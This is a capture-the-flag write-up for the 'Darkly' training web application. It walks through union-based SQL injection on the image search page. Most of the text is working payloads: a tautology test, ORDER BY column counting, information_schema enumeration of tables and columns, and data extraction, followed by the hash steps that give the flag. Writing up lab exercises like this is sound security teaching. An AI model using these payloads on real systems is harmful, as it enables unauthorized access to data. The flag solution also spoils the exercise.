# SQL Injection in Image Search Feature

## Description

SQL Injection occurs when an application allows user-supplied input to modify or manipulate SQL queries. This vulnerability can be exploited to access unauthorized data, enumerate database schemas, and even compromise the underlying system.

## Identify the Vulnerability

The `Darkly` application includes an image search feature accessible via the following endpoint:

```plaintext
http://darkly/index.php?page=searchimg
```

The input field for searching images is vulnerable to SQL Injection, allowing attackers to manipulate database queries.

###  Steps to Exploit:

1. Test for Basic SQL Injection:
- Inject the payload `1 OR 1=1` into the input field.
- Observe that the application returns all images, confirming the vulnerability.

2. Determine the Number of Columns:
- Use the `ORDER BY` clause to identify the number of columns in the query:
  - `ORDER BY` 1 works.
  - `ORDER BY` 2 works.
  - `ORDER BY` 3 fails, indicating the query uses 2 columns.
3. Enumerate the Database Name:

- Use a `UNION` query to retrieve the database name:
```sql
1 UNION SELECT NULL, DATABASE()
```
- The database name `Member_images` is revealed.

4. Enumerate Tables:
- Use a `UNION` query to list all tables in the database:
```sql
1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 0x4d656d6265725f696d61676573
```
- The table `list_images` is identified.

5. Enumerate Columns in the Table:
- Use a `UNION` query to list columns in the `list_images` table:
```sql
1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573
```
- The columns `id`, `url`, `title`, and `comment` are identified.

6. Extract Data from the Columns:
- Query the `title` and `comment` fields from the `list_images` table:
```sql
1 UNION SELECT title, comment FROM list_images
```

7. Find the Flag Hint:
- One of the titles contains the following message:
```plaintext
If you read this just use this md5 decode lowercase then sha256 to win this flag!: 1928e8083cf461a51303633093573c46
```

8. Decode the MD5 Hash:
- Use a tool like CrackStation to decode the MD5 hash `1928e8083cf461a51303633093573c46`, which resolves to `albatroz`.

9. Generate the SHA256 Hash:
- Convert the result to SHA256 to retrieve the flag:
```bash
echo -n albatroz | sha256sum
```

### Observed Impact

This vulnerability allows an attacker to:
- Access sensitive data, including database schema and records.
- Enumerate tables and columns within the database.